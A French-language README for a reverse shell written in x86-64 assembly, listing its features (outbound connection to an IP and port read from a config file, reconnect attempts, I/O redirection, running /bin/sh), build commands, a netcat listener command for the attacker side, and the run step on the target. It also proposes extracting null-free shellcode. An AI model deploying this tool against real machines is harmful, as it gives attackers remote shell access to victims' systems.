
# 🐚 Reverse Shell en assembleur x86_64

Ce projet implémente un reverse shell en assembleur x86-64. Il établit une connexion sortante vers une machine distante et ouvre un shell interactif sur cette connexion. L’IP et le port sont lus dynamiquement depuis un fichier `config.txt`.

## Fonctionnalités

- Connexion TCP sortante vers une IP et un port définis dans un fichier.
- Lecture automatique de l’IP et du port depuis `config.txt` (format `127.0.0.1:4444`).
- Construction de la structure `sockaddr_in` à partir des données lues.
- Tentatives de reconnexion toutes les 5 secondes si la machine distante n’est pas en écoute.
- Redirection des entrées/sorties vers le socket (stdin, stdout, stderr).
- Affichage d’un petit message d’accueil en couleur à la connexion.
- Exécution du shell `/bin/sh`.

## Compilation et exécution

### 1. Contenu du fichier `config.txt`

```
127.0.0.1:4444
```

### 2. Compilation du code

```bash
nasm -f elf64 reverse_shell.asm -o reverse_shell.o
ld reverse_shell.o -o reverse_shell
```

### 3. Lancement du listener sur l’attaquant

```bash
nc -lvnp 4444
```

### 4. Exécution sur la machine cible

```bash
./reverse_shell
```

## Pour aller plus loin

- Extraction du shellcode brut sans `\x00` depuis le binaire.
- Optimisation de la taille du shellcode.
